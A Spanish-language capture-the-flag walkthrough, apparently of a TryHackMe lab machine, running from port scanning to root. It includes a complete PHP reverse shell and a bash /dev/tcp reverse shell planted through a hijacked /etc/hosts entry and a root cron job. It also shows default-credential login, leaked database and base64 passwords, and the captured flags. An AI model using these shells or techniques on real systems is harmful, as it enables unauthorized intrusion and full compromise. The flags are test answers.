primero ejecuto un escaneo de puertos : 


davidoberst@archlinux ~]$ nmap -sV -O 10.65.149.61
TCP/IP fingerprinting (for OS scan) requires root privileges.
QUITTING!
[davidoberst@archlinux ~]$ sudo nmap -sV -O 10.65.149.61
[sudo] password for davidoberst: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-29 14:28 -0500
Nmap scan report for 10.65.149.61
Host is up (0.069s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
85/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=6/29%OT=85%CT=1%CU=37937%PV=Y%DS=3%DC=I%G=Y%TM=6A42C77
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)SEQ
OS:(SP=108%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)SEQ(SP=108%GCD=1%ISR=109%TI=Z%
OS:CI=I%II=I%TS=8)SEQ(SP=F7%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)SEQ(SP=FB%GCD
OS:=1%ISR=104%TI=Z%CI=I%II=I%TS=8)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E8
OS:NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=68DF%W2=68DF%W
OS:3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M4E8NNSNW7%CC=
OS:Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z
OS:%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G
OS:%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops




al entrar, puedo ver la app, muestra un mensaje que dice :

Bwa, ha, ha, pathetic, you'll never learn!

hare un listado de directorios con gobster para ver si hay mas directrorios : 

[davidoberst@archlinux Web-Content]$ gobuster dir -u http://10.65.149.61:85/ -w common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.65.149.61:85/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htpasswd            (Status: 403) [Size: 288]
.hta                 (Status: 403) [Size: 283]
.htaccess            (Status: 403) [Size: 288]
app                  (Status: 301) [Size: 312] [--> http://10.65.149.61:85/app/]
index.html           (Status: 200) [Size: 647]
server-status        (Status: 403) [Size: 292]
Progress: 4751 / 4751 (100.00%)
===============================================================
Finished
===============================================================
[davidoberst@archlinux Web-Content]$ 


puedo ver que app, esta disonible, al entrar me muestra una url : 
http://10.65.149.61:85/app/castle/index.php
donde se ve un blog, usando como tcnologia PHP,Apache,Ubuntu y COncrete CMS

hare otro fuzzing a : 
http://10.65.149.61:85/app/castle/
con el comando: 
gobuster dir -u http://10.65.149.61:85/app/castle/ -w common.txt

el fuzzing encontro cosas interesantes : 

[+] Url:                     http://10.65.149.61:85/app/castle/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 294]
.htaccess            (Status: 403) [Size: 299]
.htpasswd            (Status: 403) [Size: 299]
application          (Status: 301) [Size: 331] [--> http://10.65.149.61:85/app/castle/application/]
concrete             (Status: 301) [Size: 328] [--> http://10.65.149.61:85/app/castle/concrete/]
index.php            (Status: 200) [Size: 12047]
packages             (Status: 301) [Size: 328] [--> http://10.65.149.61:85/app/castle/packages/]
robots.txt           (Status: 200) [Size: 532]
updates              (Status: 301) [Size: 327] [--> http://10.65.149.61:85/app/castle/updates/]
Progress: 4751 / 4751 (100.00%)


al listar los driectorios activos, tenemos : 

http://10.65.149.61:85/app/castle/application/ ---> Una pagina en blanco, interesante.

http://10.65.149.61:85/app/castle/concrete/ ---> Toda la estructura de archivos del servidor web.

http://10.65.149.61:85/app/castle/packages/ ---> direcotio de Apache sin contenido. 

http://10.65.149.61:85/app/castle/updates/ ---> direcotio de Apache sin contenido. 

robots.txt   ---> mapeo de la pagina, muestra el contenido : 

User-agent: *
Disallow: /application/attributes
Disallow: /application/authentication
Disallow: /application/bootstrap
Disallow: /application/config
Disallow: /application/controllers
Disallow: /application/elements
Disallow: /application/helpers
Disallow: /application/jobs
Disallow: /application/languages
Disallow: /application/mail
Disallow: /application/models
Disallow: /application/page_types
Disallow: /application/single_pages
Disallow: /application/tools
Disallow: /application/views
Disallow: /ccm/system/captcha/picture


----REVISION PROFUNDA DE LAS URLS ENCONTRADAS -------

 http://10.65.149.61:85/app/castle/concrete/ muestra toda la estructutra php del servidor web,sin embago, en todas dice acces denied, excepto en los archivos js.

tambien contre un directorio login.php

al entrar pude  acceder con las credenciales admin password

luego de navegar un rato por la pagina, habia una opcion para subir archivos, y otrsa opcion para poder elegitr que archivos se pueden subir a el blog, asi que permiti subir archivos como 

.php y .py

pusi como listener a netcat en el puerto 443 

genere la siguiente reverse sehll : 


<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.138.111';
$port = 443;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?>



esa reverse shell la subi al sitio, y acedi al archivo donde se subio, una vez la abri netcatestablecio conexion 
- 



[davidoberst@archlinux ~]$ sudo nc -lvnp 443
[sudo] password for davidoberst: 
Listening on 0.0.0.0 443
Connection received on 10.65.149.61 40526
Linux mkingdom.thm 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 16:48:24 up  1:36,  0 users,  load average: 0.02, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),1003(web)
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 


ahora vamois a ver que hay 




$ cat database.php
<?php

return [
    'default-connection' => 'concrete',
    'connections' => [
        'concrete' => [
            'driver' => 'c5_pdo_mysql',
            'server' => 'localhost',
            'database' => 'mKingdom',
            'username' => 'toad',
            'password' => 'toadisthebest',
            'character_set' => 'utf8',
            'collation' => 'utf8_unicode_ci',
        ],
    ],
];
$ 


como noi hay puerto ssh abierto, cambiare directamente a toad y usare esa contraseña. 

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@mkingdom:/$ su toad
su toad
Password: 


toad@mkingdom:~$ cat smb.txt
cat smb.txt

Save them all Mario!

                                      \| /
                    ....'''.           |/
             .''''''        '.       \ |
             '.     ..     ..''''.    \| /
              '...''  '..''     .'     |/
     .sSSs.             '..   ..'    \ |
    .P'  `Y.               '''        \| /
    SS    SS                           |/
    SS    SS                           |
    SS  .sSSs.                       .===.
    SS .P'  `Y.                      | ? |
    SS SS    SS                      `==='
    SS ""    SS
    P.sSSs.  SS
    .P'  `Y. SS
    SS    SS SS                 .===..===..===..===.
    SS    SS SS                 |   || ? ||   ||   |
    ""    SS SS            .===.`==='`==='`==='`==='
  .sSSs.  SS SS            |   |
 .P'  `Y. SS SS       .===.`==='
 SS    SS SS SS       |   |
 SS    SS SS SS       `==='
SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS

toad@mkingdom:~$ 



aun no hay bandera, sigamos biuscando : 

el suaurio toad staba vacio, vamos a esclaar a mario.

toad@mkingdom:~/Public$ env
env
APACHE_PID_FILE=/var/run/apache2/apache2.pid
XDG_SESSION_ID=c2
SHELL=/bin/bash
APACHE_RUN_USER=www-data
USER=toad
LS_COLORS=
PWD_token=aWthVGVOVEFOdEVTCg==
MAIL=/var/mail/toad
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
APACHE_LOG_DIR=/var/log/apache2
PWD=/home/toad/Public
LANG=en_US.UTF-8
APACHE_RUN_GROUP=www-data
HOME=/home/toad
SHLVL=2
LOGNAME=toad
LESSOPEN=| /usr/bin/lesspipe %s
XDG_RUNTIME_DIR=/run/user/1002
APACHE_RUN_DIR=/var/run/apache2
APACHE_LOCK_DIR=/var/lock/apache2
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/env


encontre un base 64 3n PWD_TOken, al decodificarlo 

ikaTeNTANtES

use esa ontraseña en mario, pude acceder a el 

mario@mkingdom:/home/toad/Public$ whoami
whoami
mario

al listar los archovos de /home/mario pude ver que esta user.txt, sin embargo al acceder a ella con cat dice 
cat: user.txt: Permission denied
asi que copie el archoivo a tmp, y desde tmp pude ver la bandera 


mario@mkingdom:~$ cp user.txt /tmp
cp user.txt /tmp
mario@mkingdom:~$ cd /tmp
cd /tmp
mario@mkingdom:/tmp$ ls -a
ls -a
.  ..  .ICE-unix  user.txt  .X0-lock  .X11-unix
mario@mkingdom:/tmp$ cat user.txt
cat user.txt
thm{030a769febb1b3291da1375234b84283}
mario@mkingdom:/tmp$ 



ahora para intentar ganar acceso a root, creare un servidor de python y enviare a mario linpeas.sh 

python3 -m http.server 9999

--2026-07-01 12:05:12--  http://192.168.138.111:9999/linpeas.sh
Connecting to 192.168.138.111:9999... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1065387 (1.0M) [application/x-sh]
Saving to: ‘linpeas.sh’

100%[======================================>] 1,065,387   2.07MB/s   in 0.5s   

2026-07-01 12:05:13 (2.07 MB/s) - ‘linpeas.sh’ saved [1065387/1065387]


le dare permisos de ejecucion :


mario@mkingdom:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
mario@mkingdom:/tmp$ sh linpeas.sh


hallazgo de linpeas : 

el archivo/etc/hosts/ es modificable, tiene permisos de escritura

mario@mkingdom:/tmp$ cat /etc/hosts
cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       mkingdom.thm
127.0.0.1       backgroundimages.concrete5.org
127.0.0.1       www.concrete5.org
127.0.0.1       newsflow.concrete5.org

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

intente buscar mas respuestas de linpeas, pero no daba mas informacion, busque en internet y en este caso puede usar una herramienta llamda para ver que esta eejcutando el sistema en tiempo real, la herramietnta encontro los procesos : 

2026/07/01 12:26:01 CMD: UID=0     PID=20470  | curl mkingdom.thm:85/app/castle/application/counter.sh 
2026/07/01 12:26:01 CMD: UID=0     PID=20469  | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter


al abrirlo en el navegador, dice :

!/bin/bash
echo "There are $(ls -laR /var/www/html/app/castle/ | wc -l) folder and files in TheCastleApp in - - - - > $(date)."


en etc/hosts , en vez la ip de localhost , puse la ip del ataante

luego recree el directorio donde esta el script en mi home 

[davidoberst@archlinux application]$ pwd
/home/davidoberst/app/castle/application
[davidoberst@archlinux application]$ 

luego dentro de esa ruta, creo counter.sh, pero agregando un script de una rs

echo -e '#!/bin/bash\nbash -i >& /dev/tcp/192.168.138.111/4444 0>&1' > counter.sh


luego un oyente para ejecutar la rs

[davidoberst@archlinux ~]$ sudo python3 -m http.server 85
[sudo] password for davidoberst: 
Serving HTTP on 0.0.0.0 port 85 (http://0.0.0.0:85/) ...




luego de un tiempo la rs se ejecuto 

[davidoberst@archlinux ~]$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 
bash: cannot set terminal process group (21382): Inappropriate ioctl for device
bash: no job control in this shell
root@mkingdom:~# whoami
whoami
root
root@mkingdom:~# 


root@mkingdom:~# cat root.txt
cat root.txt
cat: root.txt: Permission denied
root@mkingdom:~# 


la bandera no tiene permisos, la pasare a tmp 


root@mkingdom:~# cp root.txt /tmp
cp root.txt /tmp
root@mkingdom:~# cd /tmp
cd /tmp
root@mkingdom:/tmp# ls
ls
linpeas.sh
pspy64
root.txt


aqui esta la bandera!

root@mkingdom:/tmp# cat root.txt
cat root.txt
thm{e8b2f52d88b9930503cc16ef48775df0}
root@mkingdom:/tmp# 







